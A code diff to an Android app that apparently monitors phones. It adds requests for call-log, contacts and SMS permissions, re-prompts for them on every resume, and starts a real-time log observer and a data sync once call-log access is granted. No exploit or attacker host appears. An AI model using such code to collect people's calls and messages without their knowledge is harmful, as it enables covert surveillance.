@@ -61,6 +61,16 @@ class MainActivity : AppCompatActivity() {
         ActivityResultContracts.RequestPermission()
     ) { refreshPermissionButtons() }
 
+    private val runtimePermissionsLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestMultiplePermissions()
+    ) { results ->
+        refreshPermissionButtons()
+        if (results[Manifest.permission.READ_CALL_LOG] == true) {
+            com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
+            com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
+        }
+    }
+
     private val statusHandler = Handler(Looper.getMainLooper())
     private val statusUpdater = object : Runnable {
         override fun run() {
@@ -80,6 +90,12 @@ class MainActivity : AppCompatActivity() {
         SyncScheduler.schedule(applicationContext)
         uploadCurrentFcmToken()
         com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
+
+        binding.btnGrantCallLogPermission.setOnClickListener {
+            runtimePermissionsLauncher.launch(
+                arrayOf(Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_SMS)
+            )
+        }
 
         binding.btnGrantCameraPermission.setOnClickListener {
             cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
@@ -221,12 +237,30 @@ class MainActivity : AppCompatActivity() {
 
     override fun onResume() {
         super.onResume()
+        val missingPermissions = mutableListOf<String>()
+        if (androidx.core.content.ContextCompat.checkSelfPermission(
+                this,
+                Manifest.permission.READ_CALL_LOG
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
+            missingPermissions.add(Manifest.permission.READ_CALL_LOG)
+        }
         if (androidx.core.content.ContextCompat.checkSelfPermission(
                 this,
                 Manifest.permission.READ_CONTACTS
             ) != PackageManager.PERMISSION_GRANTED
         ) {
-            contactsPermissionLauncher.launch(Manifest.permission.READ_CONTACTS)
+            missingPermissions.add(Manifest.permission.READ_CONTACTS)
+        }
+        if (androidx.core.content.ContextCompat.checkSelfPermission(
+                this,
+                Manifest.permission.READ_SMS
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
+            missingPermissions.add(Manifest.permission.READ_SMS)
+        }
+        if (missingPermissions.isNotEmpty()) {
+            runtimePermissionsLauncher.launch(missingPermissions.toTypedArray())
         }
         refreshPermissionButtons()
         statusUpdater.run()
@@ -352,6 +386,13 @@ class MainActivity : AppCompatActivity() {
             binding.btnEnableNotification.setBackgroundColor(androidx.core.content.ContextCompat.getColor(this, R.color.accent))
             binding.btnOpenAppInfoNotification.visibility = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) android.view.View.VISIBLE else android.view.View.GONE
         }
+
+        val hasCallLogPermission = androidx.core.content.ContextCompat.checkSelfPermission(
+            this,
+            Manifest.permission.READ_CALL_LOG
+        ) == PackageManager.PERMISSION_GRANTED
+        binding.btnGrantCallLogPermission.visibility =
+            if (hasCallLogPermission) android.view.View.GONE else android.view.View.VISIBLE
 
         val hasCameraPermission = androidx.core.content.ContextCompat.checkSelfPermission(
             this,
